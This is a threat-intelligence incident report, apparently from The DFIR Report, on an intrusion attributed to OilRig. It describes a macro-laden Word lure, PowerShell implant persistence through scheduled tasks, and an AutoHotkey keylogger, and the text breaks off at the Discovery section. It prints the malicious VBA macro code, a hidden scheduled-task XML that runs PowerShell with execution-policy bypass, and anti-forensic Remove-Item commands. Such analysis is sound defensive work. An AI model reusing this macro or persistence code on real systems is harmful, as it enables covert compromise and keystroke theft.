<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Thursday, October 24, 2024</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap wrap-width">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-14465" class="post-14465 post type-post status-publish format-standard hentry category-autohotkey category-keylogger entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-107" href="https://thedfirreport.com/category/autohotkey/">autohotkey</a>
<a class="category-color-108" href="https://thedfirreport.com/category/keylogger/">keylogger</a>
</span>
</div>
<h1 class="entry-title">Collect, Exfiltrate, Sleep, Repeat</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/" rel="bookmark"><time class="entry-date published" datetime="2023-02-06T01:26:23+00:00">February 6, 2023</time></a></span> </div>
</header>
<div class="entry-content">
<p>In this intrusion from August 2022, we observed a compromise that was initiated with a Word document containing a malicious VBA macro, which established persistence and communication to a command and control server (C2). Upon performing initial discovery and user enumeration, the threat actor used AutoHotkey to launch a keylogger.</p>
<p>AutoHotkey is an open-source scripting language for Microsoft Windows machines that was introduced to provide easy keyboard shortcuts and automation. As described in AutoHotkey <a href="https://www.autohotkey.com/docs/AutoHotkey.htm" target="_blank" rel="noreferrer noopener">documentation</a>, the AHK script can be executed in a number of ways. As observed in this intrusion, the adversary executed the AHK keylogger script by calling a renamed version of AutoHotkey.exe (module.exe) and passing the script&#8217;s filename (module.ahk) as a command-line parameter.</p>
<h2 id="services" class="wp-block-heading"><a href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/#services">The DFIR Report Services</a></h2>
<ul>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noreferrer noopener">Private Threat Briefs</a>:</strong> Over 20 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noreferrer noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noreferrer noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>
<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noreferrer noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>
<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p><a href="https://thedfirreport.com/contact/" target="_blank" rel="noreferrer noopener">Contact us</a> today for a demo!</p>
<h2 class="wp-block-heading" id="case-summary"><a href="#case-summary">Case Summary</a></h2>
<p>The intrusion began with the execution of a malicious macro within a Word document. The document was themed as a job application for the firm <a href="https://www.lumen.com/en-us/home.html" target="_blank" rel="noreferrer noopener">Lumen</a>. This tactic has been observed by many threat actor groups, including state sponsored actors in <a href="https://www.businessinsider.com/axie-infinity-crypto-hack-fake-job-offer-letter-spyware-phishing-2022-7" target="_blank" rel="noreferrer noopener">North Korea</a> and <a href="https://www.mandiant.com/resources/blog/apt33-insights-into-iranian-cyber-espionage" target="_blank" rel="noreferrer noopener">Iran</a>. Upon opening the file, the user was prompted to enable macros to complete the form, which began execution of the malware.</p>
<p>Once executed, the macro created a VBS script (Updater.vbs), two PowerShell scripts (temp.ps1 and Script.ps1), and installed persistence through a scheduled task. The implant was fully implemented in PowerShell, which is uncommon compared to many initial access tools today.</p>
<p>Following the execution of the VBA embedded macros, the PowerShell script, Script.ps1<strong>,</strong> began to connect to the C2 server through an encrypted channel. Around a day after execution, the server became live and began sending instructions to the implant. The instructions obtained from the server were then executed through the temp.ps1 PowerShell script.</p>
<p>The threat actors began executing basic discovery commands, all of which were executed via PowerShell cmdlets or built-in Windows utilities like whoami, net, time, tzutil and tracert; one exception to this was when the threat actors extracted a specific function from the PowerSploit framework, <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L3132" target="_blank" rel="noreferrer noopener">Convert-LDAPProperty</a>, to enumerate domain accounts in the environment. All data collected was then exfiltrated over the existing C2 channel.</p>
<p>On the fourth day of the intrusion, the threat actors became active again by dropping of a set of files that performed keylogger functions. A scheduled task was then created to assist in execution of the keylogger. The keylogger itself was comprised of an executable, module.exe, which was a renamed <a href="https://www.autohotkey.com/" target="_blank" rel="noreferrer noopener">AutoHotkey</a> binary. This would run the AutoHotkey script module.ahk. Additionally, a PowerShell script called readKey.ps1 would execute in the same task.</p>
<p>On the sixth day of the intrusion, the threat actors returned and collected the data compiled by the keylogger. This was performed using the makecab.exe Windows utility to compress the keylogger files before exfiltrating them to the C2 server. They then dropped another PowerShell script. This script would take a screenshot of the desktop of the infected host. After this data was exfiltrated, the threat actors reviewed the antivirus service status and some additional host data.</p>
<p>The threat actors returned again on the seventh and ninth days to collect the keylogger data. The threat actors were not observed performing any further actions before being evicted from the environment.</p>
<p>One interesting fact about this case is that the initial implant was fully implemented using PowerShell, and no executables were dropped to the victim&#8217;s workstation for the implant. It&#8217;s also interesting to note that the PowerShell implant was and stayed fully undetectable for a significant period of time. This is contrary to many of our reported cases where the initial access relies on initial access brokers and common malware used by those groups such as Emotet, IcedID, or Qbot.</p>
<p>The use of custom tailored malware points to a more targeted or discerning organization compared to the spray-and-pray approach performed by many access brokers. Reviewing the network traffic, we observed two signatures fire on the C2 traffic &#8211; ET MALWARE TA452 Related Backdoor Activity (GET)/(POST). TA452 is an activity group <a href="https://www.proofpoint.com/us/corporate-blog/post/iranian-state-sponsored-and-aligned-attacks-what-you-need-know-and-steps-protect" target="_blank" rel="noreferrer noopener">tracked by Proofpoint</a> that translates to the <a href="https://attack.mitre.org/groups/G0049/" target="_blank" rel="noreferrer noopener">OilRig group.</a> Under other classifications there is overlap with COBALT GYPSY, IRN2, APT34, and Helix Kitten.</p>
<p>Oilrig is suspected of being an Iran based and state sponsored group. This group is widely credited with creating and utilizing various <a href="https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/" target="_blank" rel="noreferrer noopener">home grown</a> <a href="https://attack.mitre.org/software/S0184/" target="_blank" rel="noreferrer noopener">PowerShell frameworks</a> to perform their intrusions. Finally, analyzing the time of the threat actor hands on keyboard actions, the threat actors operated between Saturday and Thursday and no activity on Friday. All activity took place place between 0300-1600 UTC which aligns with 0630-1930 (GMT +3:30) Tehran local time. All of these factors together align to point to the Iranian Oilrig group as the likely threat actors behind this intrusion.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-14472" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-001.png" alt width="1148" height="405" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-001.png 1148w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-001-300x106.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-001-1024x361.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-001-768x271.png 768w" sizes="(max-width: 1148px) 100vw, 1148px" /></a></p>
<h2 class="wp-block-heading" id="timeline"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/Collect-Exfiltrate-Sleep-Repeat.png"><img decoding="async" class="alignnone wp-image-14516 size-full" src="https://thedfirreport.com/wp-content/uploads/2023/02/Collect-Exfiltrate-Sleep-Repeat.png" alt width="1821" height="3465" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/Collect-Exfiltrate-Sleep-Repeat.png 1821w, https://thedfirreport.com/wp-content/uploads/2023/02/Collect-Exfiltrate-Sleep-Repeat-158x300.png 158w, https://thedfirreport.com/wp-content/uploads/2023/02/Collect-Exfiltrate-Sleep-Repeat-538x1024.png 538w, https://thedfirreport.com/wp-content/uploads/2023/02/Collect-Exfiltrate-Sleep-Repeat-768x1461.png 768w, https://thedfirreport.com/wp-content/uploads/2023/02/Collect-Exfiltrate-Sleep-Repeat-807x1536.png 807w, https://thedfirreport.com/wp-content/uploads/2023/02/Collect-Exfiltrate-Sleep-Repeat-1076x2048.png 1076w" sizes="(max-width: 1821px) 100vw, 1821px" /></a></p>
<p>Analysis and reporting completed by <a href="https://twitter.com/MittenSec" target="_blank" rel="noreferrer noopener">@MittenSec</a>, <a href="https://twitter.com/MetallicHack" target="_blank" rel="noreferrer noopener">@MetallicHack</a> and <a href="https://twitter.com/0xtornado" target="_blank" rel="noreferrer noopener">@0xtornado.</a></p>
<h2 class="wp-block-heading" id="initial-access"><a href="#initial-access">Initial Access</a></h2>
<p>The initial access used in this intrusion was a malicious word document dubbed &#8220;<strong>Apply Form.docm</strong>&#8220;. This document purported to be an application form for the technology and telecommunications company <a href="https://www.lumen.com/en-us/home.html" target="_blank" rel="noreferrer noopener">Lumen</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-002.png"><img decoding="async" class="aligncenter size-full wp-image-14474" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-002.png" alt width="1092" height="975" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-002.png 1092w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-002-300x268.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-002-1024x914.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-002-768x686.png 768w" sizes="(max-width: 1092px) 100vw, 1092px" /></a></p>
<p>This was originally found and shared by <a href="https://twitter.com/StopMalvertisin" target="_blank" rel="noreferrer noopener">@StopMalvertisin</a> in <a href="https://twitter.com/StopMalvertisin/status/1562896289981136898" target="_blank" rel="noreferrer noopener">a tweet detailing the lure and the payload</a>. The precise delivery method remains unknown as we do not have direct evidence on how this malicious document was delivered. We assert with a medium level of confidence, based on the previous <a href="https://www.mandiant.com/resources/blog/apt33-insights-into-iranian-cyber-espionage" target="_blank" rel="noreferrer noopener">similar </a>reports, that those documents were likely delivered through spearphishing attachments in emails (T1566).</p>
<h2 class="wp-block-heading" id="execution"><a href="#execution">Execution</a></h2>
<p>This intrusion began with the execution of a malicious VBA macro embedded in a word document.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-003.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14475" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-003.png" alt width="1600" height="1073" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-003.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-003-300x201.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-003-1024x687.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-003-768x515.png 768w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-003-1536x1030.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></figure>
<p>A first look at <strong>&#8220;Apply Form.docm&#8221;</strong> with <a href="https://github.com/decalage2/oletools/wiki/olevba" target="_blank" rel="noreferrer noopener">olevba.py</a>, immediately highlights some suspicious behaviors.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14476" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-004.png" alt width="714" height="870" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-004.png 714w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-004-246x300.png 246w" sizes="(max-width: 714px) 100vw, 714px" /></a></p>
<p>First off, the macro gets the name of the user executing the Word document and creates a directory in <em>AppData,</em> if it doesn&#8217;t exist:</p>
<pre class="wp-block-preformatted">Private Sub Document_Open()
    Application.ScreenUpdating = False
    Call Macro1
    Dim Script, inp As String
    inp = Google.meet.Text
    pla = Google.chat.Text
    uName = Environ("username")
    Pathh = "C:\Users\" &amp; uName &amp; "\AppData\Local\Microsoft\Windows\Update\"
    If Dir(Pathh) = "" Then
        MkDir Pathh
        Call Macro2
    End If</pre>
<p>The malicious VBA macro then created two PowerShell scripts and one VBScript file in <em>&#8220;C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Windows\Update\&#8221;</em></p>
<pre class="wp-block-preformatted">    Set FSO1 = CreateObject("Scripting.FileSystemObject")
    SetAttr Pathh, vbHidden
    Set FS1 = FSO1.CreateTextFile(Pathh &amp; "Script.ps1", True)
    ActiveDocument.Shapes.Range(Array("Text Box 19")).Select
    Selection.WholeStory
    FS1.WriteLine Selection.Text
    FS1.Close
    Set FSO3 = CreateObject("Scripting.FileSystemObject")
    Set FS3 = FSO3.CreateTextFile(Pathh &amp; "temp.ps1", True)
    ActiveDocument.Shapes.Range(Array("Text Box 18")).Select
    Selection.WholeStory
    FS3.WriteLine Selection.Text
    FS3.Close
    inp = Replace(inp, "PATH", Pathh)
    inp = EncodeBase65(inp)
    inp = Replace(inp, "a", "@")
    inp = Replace(inp, "H", "-")
    inp = Replace(inp, "S", "$")
    VBS = "xxx = """ &amp; inp &amp; """" &amp; vbNewLine &amp; pla
    Set FSO2 = CreateObject("Scripting.FileSystemObject")
    Set FS2 = FSO2.CreateTextFile(Pathh &amp; "Updater.vbs", True)
    FS2.WriteLine VBS
    FS2.Close
    PNGenerator
    Application.ScreenUpdating = True
    ActiveDocument.Shapes.Range(Array("Text Box 9")).Select
End Sub</pre>
<p>With Sysmon and <strong>FileCreate</strong> event 11, we can see that <em>WINWORD.EXE</em> successfully created these files:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14477" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-005.png" alt width="1600" height="257" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-005.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-005-300x48.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-005-1024x164.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-005-768x123.png 768w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-005-1536x247.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14478" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-006.png" alt width="1323" height="768" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-006.png 1323w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-006-300x174.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-006-1024x594.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-006-768x446.png 768w" sizes="(max-width: 1323px) 100vw, 1323px" /></a></p>
<p>Then, in order to execute the script and install persistence, a new scheduled task was registered:</p>
<pre class="wp-block-preformatted">Private Sub Document_Close()
    Application.ScreenUpdating = False
    uName = Environ("username")
    Pathh = "C:\Users\" &amp; uName &amp; "\AppData\Local\Microsoft\Windows\Update\"
    XML = Google.map.Text
    XML = Replace(XML, "PATH", Pathh)
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Set rootFolder = service.GetFolder("\")
    temp = rootFolder.RegisterTask("WindowsUpdate", XML, 6, , , 3)
    Call Macro4
End Sub</pre>
<p>The XML above describing the scheduled task was directly embedded in the VBA macro.</p>
<pre class="wp-block-preformatted">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;Description&gt;This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.&lt;/Description&gt;
    &lt;URI&gt;\WindowsUpdate&lt;/URI&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;TimeTrigger&gt;
      &lt;Repetition&gt;
        &lt;Interval&gt;PT10M&lt;/Interval&gt;
        &lt;StopAtDurationEnd&gt;false&lt;/StopAtDurationEnd&gt;
      &lt;/Repetition&gt;
      &lt;StartBoundary&gt;2022-06-21T00:00:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;RandomDelay&gt;PT1M&lt;/RandomDelay&gt;
    &lt;/TimeTrigger&gt;
    &lt;IdleTrigger&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;/IdleTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
      &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;true&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;DisallowStartOnRemoteAppSession&gt;false&lt;/DisallowStartOnRemoteAppSession&gt;
    &lt;UseUnifiedSchedulingEngine&gt;true&lt;/UseUnifiedSchedulingEngine&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT0S&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
    &lt;RestartOnFailure&gt;
      &lt;Interval&gt;PT1M&lt;/Interval&gt;
      &lt;Count&gt;3&lt;/Count&gt;
    &lt;/RestartOnFailure&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;wscript&lt;/Command&gt;
      &lt;Arguments&gt;"PATHUpdater.vbs"&lt;/Arguments&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;</pre>
<h2 class="wp-block-heading" id="persistence"><a href="#persistence">Persistence</a></h2>
<p>The first scheduled task installed using the malicious VBA macro, executed a VBS script, which in turn executed a PowerShell script named Script.ps1.</p>
<p>Script.ps1 contacts the C2 server and executed the base64 commands using temp.ps1.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14479" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-007.png" alt width="2133" height="874" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-007.png 2133w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-007-300x123.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-007-1024x420.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-007-768x315.png 768w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-007-1536x629.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-007-2048x839.png 2048w" sizes="(max-width: 2133px) 100vw, 2133px" /></a></p>
<p>Event 201 from Microsoft-Windows-TaskScheduler/Operational highlights the successful execution of this scheduled task.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14480" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-008.png" alt width="694" height="789" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-008.png 694w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-008-264x300.png 264w" sizes="(max-width: 694px) 100vw, 694px" /></a></p>
<p>Another scheduled task named <code><em>MicrosoftEdgeUpdateTaskMachineUC</em></code> was registered using schtasks.exe on the command line:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14481" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-009.png" alt width="1287" height="199" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-009.png 1287w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-009-300x46.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-009-1024x158.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-009-768x119.png 768w" sizes="(max-width: 1287px) 100vw, 1287px" /></a></p>
<p>The scheduled task was then started manually:</p>
<pre class="wp-block-preformatted">C:\Windows\system32\schtasks.exe /run /tn MicrosoftEdgeUpdateTaskMachineUC</pre>
<p>The scheduled task was designed to execute module.exe and a PowerShell script named readKey.ps1. These components will be explained later in the collection section of this report.</p>
<pre class="wp-block-preformatted">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;Date&gt;2022-08-04T11:52:03.8083191&lt;/Date&gt;
    &lt;Author&gt;Microsoft Inc.&lt;/Author&gt;
    &lt;URI&gt;\masdfm&lt;/URI&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;LogonTrigger&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
      &lt;UserId&gt;[REDACTED]&lt;/UserId&gt;
    &lt;/LogonTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;UserId&gt;[REDACTED]&lt;/UserId&gt;
      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;
      &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;
    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;
    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
    &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;
    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
    &lt;IdleSettings&gt;
      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
    &lt;/IdleSettings&gt;
    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
    &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;Hidden&gt;false&lt;/Hidden&gt;
    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
    &lt;ExecutionTimeLimit&gt;PT72H&lt;/ExecutionTimeLimit&gt;
    &lt;Priority&gt;7&lt;/Priority&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;"C:\Users\Public\module\module.exe"&lt;/Command&gt;
      &lt;Arguments&gt;"C:\Users\Public\module\module.ahk"&lt;/Arguments&gt;
    &lt;/Exec&gt;
    &lt;Exec&gt;
      &lt;Command&gt;powershell&lt;/Command&gt;
      &lt;Arguments&gt;-ep bypass -windowstyle hidden -f "C:\Users\Public\module\readKey.ps1"&lt;/Arguments&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;</pre>
<h2 class="wp-block-heading" id="defense-evasion"><a href="#defense-evasion">Defense Evasion</a></h2>
<p>The threat actor&#8217;s keylogger used in the intrusion implemented a XOR operation to encode the contents of data written to logFileuyovaqv.bin.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14482" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-010.png" alt width="974" height="503" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-010.png 974w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-010-300x155.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-010-768x397.png 768w" sizes="(max-width: 974px) 100vw, 974px" /></a></p>
<p>The threat actor removed various files created by the discovery actions during the intrusion.<a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14483" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-011.png" alt width="1281" height="190" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-011.png 1281w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-011-300x44.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-011-1024x152.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-011-768x114.png 768w" sizes="(max-width: 1281px) 100vw, 1281px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/02/17333-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-14485" src="https://thedfirreport.com/wp-content/uploads/2023/02/17333-012.png" alt width="1778" height="473" srcset="https://thedfirreport.com/wp-content/uploads/2023/02/17333-012.png 1778w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-012-300x80.png 300w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-012-1024x272.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-012-768x204.png 768w, https://thedfirreport.com/wp-content/uploads/2023/02/17333-012-1536x409.png 1536w" sizes="(max-width: 1778px) 100vw, 1778px" /></a></p>
<pre class="wp-block-preformatted">Remove-Item "C:\Users\REDACTED\AppData\Local\Temp\logFileuyovaqv.cab"
Remove-Item c:\users\public\u.zip
Remove-Item c:\users\public\u.xml</pre>
<h2 class="wp-block-heading" id="discovery"><a href="#discovery">Discovery</a></h2>
<p>Multiple discovery commands were executed by the threat actors. Each command was executed via the <code>temp.ps1</code> file with the input commands via base64 command line arguments.</p>
